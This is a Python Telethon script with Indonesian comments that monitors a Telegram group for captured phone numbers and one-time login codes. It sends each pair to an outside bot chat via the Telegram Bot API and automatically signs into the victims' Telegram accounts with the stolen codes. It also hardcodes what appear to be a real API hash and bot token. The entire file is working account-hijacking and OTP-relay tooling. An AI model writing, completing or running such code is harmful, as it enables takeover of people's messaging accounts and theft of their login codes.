from telethon import TelegramClient, events
import asyncio
import re
import requests

# === Config ===
api_id = 25936778               # Ganti
api_hash = 'cb2be8be4bc5742c8a409f3fed31dc8c'    # Ganti
bot_token = '7931229728:AAHFb4GiOT7sLOe3Wyc5xj-4j61TIDTmOas'  # Ganti dengan token bot kamu

group_id = -4550563481     # Ganti dengan ID grup kamu

# === Inisialisasi ===
client = TelegramClient('session_user', api_id, api_hash)
phone_sessions = {}

# === Regex Pattern ===
re_number = re.compile(r'PHONE NUMBER\s*:\s*(\+\d{10,15})')
re_otp = re.compile(r'OTP\s*:\s*(\d{4,8})')

# === Fungsi kirim pesan ke Bot ===
def send_to_bot(phone, otp):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    payload = {
        'chat_id': '1911934768',  # Ganti dengan chat_id kamu (bisa pakai @userinfobot)
        'text': f"🔐 OTP Login Terdeteksi!\n📱 Phone: {phone}\n🔑 OTP: {otp}"
    }
    response = requests.post(url, data=payload)
    print(f"[BOT] Status kirim: {response.status_code}")

# === Handler Pesan Baru ===
@client.on(events.NewMessage(chats=group_id))
async def handler(event):
    text = event.raw_text
    number_match = re_number.search(text)
    otp_match = re_otp.search(text)

    if number_match:
        phone_number = number_match.group(1)
        if phone_number not in phone_sessions:
            phone_sessions[phone_number] = {}
            print(f"[+] Nomor baru: {phone_number}")
        else:
            print(f"[=] Nomor sudah ada: {phone_number}")

    if number_match and otp_match:
        phone_number = number_match.group(1)
        otp = otp_match.group(1)

        phone_sessions[phone_number]['otp'] = otp
        print(f"[✓] OTP untuk {phone_number}: {otp}")

        # Kirim ke bot
        send_to_bot(phone_number, otp)

        # Login otomatis
        await login_with_otp(phone_number, otp)

# === Fungsi Login dengan OTP ===
async def login_with_otp(phone, otp):
    print(f"[🔑] Mencoba login ke {phone} dengan OTP {otp}")
    login_client = TelegramClient(f'session_{phone}', api_id, api_hash)
    await login_client.connect()

    if not await login_client.is_user_authorized():
        try:
            await login_client.send_code_request(phone)
            await login_client.sign_in(phone, otp)
            print(f"[✅] Login berhasil untuk {phone}")
        except Exception as e:
            print(f"[❌] Gagal login {phone}: {e}")
    else:
        print(f"[🟢] Sudah login: {phone}")

# === Main ===
async def main():
    await client.start()
    print("[🚀] Bot siap memantau grup dan login OTP otomatis...")
    await client.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
